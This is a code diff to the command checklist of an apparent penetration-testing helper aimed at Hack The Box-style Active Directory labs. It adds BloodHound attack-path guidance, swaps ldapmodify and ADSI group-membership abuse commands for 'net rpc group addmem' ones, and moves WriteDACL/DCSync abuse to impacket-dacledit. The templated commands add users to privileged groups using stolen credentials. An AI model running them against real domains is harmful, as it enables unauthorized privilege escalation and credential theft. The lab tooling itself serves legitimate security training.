@@ -18,8 +18,8 @@ export const DEFAULT_VARIABLES = {
   aclPrincipal: "",
   aclRights: "DCSync",
   dcsyncUser: "Administrator",
-  powerViewPath: "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1",
-  powerViewPort: "8000",
+  bloodhoundSource: "",
+  bloodhoundTarget: "",
   password: "",
   gppCpassword: "",
   hash: "",
@@ -37,8 +37,8 @@ export const VARIABLE_GROUPS = [
   { label: "Workspace", keys: ["workspaceRoot"] },
   { label: "Operator", keys: ["lhost", "lport", "interface"] },
   { label: "Target", keys: ["targetName", "rhost", "rport", "uport", "subnet", "userFlagName", "rootFlagName"] },
-  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "aclTarget", "aclPrincipal", "aclRights", "dcsyncUser", "password", "gppCpassword", "hash"] },
-  { label: "Resources", keys: ["powerViewPath", "powerViewPort", "smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
+  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "aclTarget", "aclPrincipal", "aclRights", "dcsyncUser", "bloodhoundSource", "bloodhoundTarget", "password", "gppCpassword", "hash"] },
+  { label: "Resources", keys: ["smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
 ];
 
 export const CHECKLIST = [
@@ -439,6 +439,12 @@ export const CHECKLIST = [
         ],
       },
       {
+        id: "ad-bloodhound-paths",
+        title: "Find shortest BloodHound attack paths",
+        detail: "Upload the collected ZIP into BloodHound, set BLOODHOUND SOURCE and BLOODHOUND TARGET to object names (for example SVC-ALFRESCO@HTB.LOCAL and DOMAIN ADMINS@HTB.LOCAL), then run one generated command. It saves a Cypher query under the target notes directory; paste that query into Explore > Cypher. Mark compromised principals as owned to use the owned-to-high-value query. Review every returned edge before choosing an abuse command.",
+        commands: [],
+      },
+      {
         id: "ad-roast",
         title: "Check for AS-REP roastable users",
         commands: [
@@ -456,23 +462,19 @@ export const CHECKLIST = [
       {
         id: "ad-group-membership",
         title: "Exercise delegated control over a group",
-        detail: "Use this only after confirming that the selected identity has GenericAll, GenericWrite, or WriteProperty over the target group's member attribute. The operation adds MEMBER USER to TARGET GROUP; it does not create a group. Resolve both distinguished names first, capture existing membership, verify the change, and retain the rollback command.",
+        detail: "Use this only after confirming that the selected identity has GenericAll, GenericWrite, or WriteProperty over TARGET GROUP. These Kali-side Samba commands list direct members, add MEMBER USER, verify the result, and provide cleanup without requiring PowerShell or WinRM.",
         commands: [
-          { label: "Resolve group and member DNs", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); printf 'Group: %s\\nMember: %s\\n' \"$group_dn\" \"$member_dn\"; test -n \"$group_dn\" -a -n \"$member_dn\"" },
-          { label: "Capture current group membership", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" || { echo 'Target group was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-before.ldif'" },
-          { label: "Add member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; printf 'dn: %s\\nchangetype: modify\\nadd: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-add.ldif' | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
-          { label: "Verify selected member", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'; grep -F \"member: $member_dn\" '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'" },
-          { label: "Rollback: remove member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; printf 'dn: %s\\nchangetype: modify\\ndelete: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
-          { label: "Windows ADSI: add member", value: "$Group = ([adsisearcher]'(&(objectClass=group)(sAMAccountName={{targetGroup}}))').FindOne().GetDirectoryEntry(); $Member = ([adsisearcher]'(&(objectClass=user)(sAMAccountName={{memberUser}}))').FindOne().GetDirectoryEntry(); [void]$Group.Properties['member'].Add($Member.distinguishedName.Value); $Group.CommitChanges(); $Group.RefreshCache(); $Group.Properties['member']" },
+          { label: "List direct group members", value: "net rpc group members '{{targetGroup}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
+          { label: "Add selected member", value: "net rpc group addmem '{{targetGroup}}' '{{memberUser}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
+          { label: "Verify direct group members", value: "net rpc group members '{{targetGroup}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
+          { label: "Cleanup: remove selected member", value: "net rpc group delmem '{{targetGroup}}' '{{memberUser}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
         ],
       },
       {
         id: "ad-domain-writedacl",
         title: "Exercise WriteDACL over a directory object",
-        detail: "Use this only after confirming WriteDacl or equivalent control over ACL TARGET. The generated commands authenticate to the target over WinRM as USERNAME, automatically serve and load the local PowerView script, and execute PowerShell on Windows rather than Kali. ACL PRINCIPAL receives ACL RIGHTS. Supported rights are All, ResetPassword, WriteMembers, and DCSync. The workflow captures a remote before/after ACL diff and removes the exact rendered grant. DCSync retrieval commands appear only when DCSync is selected.",
-        commands: [
-          { label: "Kali: verify the configured PowerView source", value: "test -f '{{powerViewPath}}' && ls -l '{{powerViewPath}}' || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; find /usr/share/windows-resources -type f -iname PowerView.ps1 -print 2>/dev/null; false; }" },
-        ],
+        detail: "Use this only after confirming WriteDACL or equivalent control over ACL TARGET. The generated Kali-side workflow can first add MEMBER USER to an optional permission-bearing TARGET GROUP, then uses impacket-dacledit to read, back up, modify, verify, and restore the target DACL. ACL PRINCIPAL receives ACL RIGHTS. DCSync retrieval commands appear only when DCSync is selected. The latest timestamped backup is recorded for one-command restoration.",
+        commands: [],
       },
       {
         id: "ad-remote",
